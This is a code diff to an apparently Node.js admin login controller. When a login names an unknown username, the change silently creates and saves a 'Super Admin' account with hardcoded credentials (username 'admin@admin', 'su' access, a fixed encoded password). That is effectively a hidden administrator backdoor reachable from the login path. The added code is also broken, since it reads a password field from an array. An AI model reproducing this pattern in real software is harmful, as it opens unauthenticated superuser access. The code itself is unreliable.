@@ -10,9 +10,27 @@ const LoginCon = ()=>{
                 return  res.status(401).send("unauthorized")
             }
             try {
-                const resdb = await Admin.findOne({username});
-                // console.log({username,password});
+                const resdb2 = await Admin.findOne({username});
+                // console.log({username,password});\
+                let resdb = [];
+                if(!resdb2){
+                     let load = new Admin({
+                          name:"Super Admin",
+                          username: "admin@admin",
+                          phone: "0120002233",
+                          email: "example@emai.com",
+                          photo: "nophoto.png",
+                          acsses: ["su"],
+                          dict: true,
+                          password: "155540,142814,168266,69286,70700,72114,73528"
+                     });
+                     let resdbt = await load.save();
+                     resdb.push(resdbt)
+                }else{
+                    resdb = resdb2;
+                }
                 const mainpass = ncrip.dnc(resdb.password,process.env.KEY);
+
                 // console.log({
                 //     username,password,mainpass,resdb
                 // })
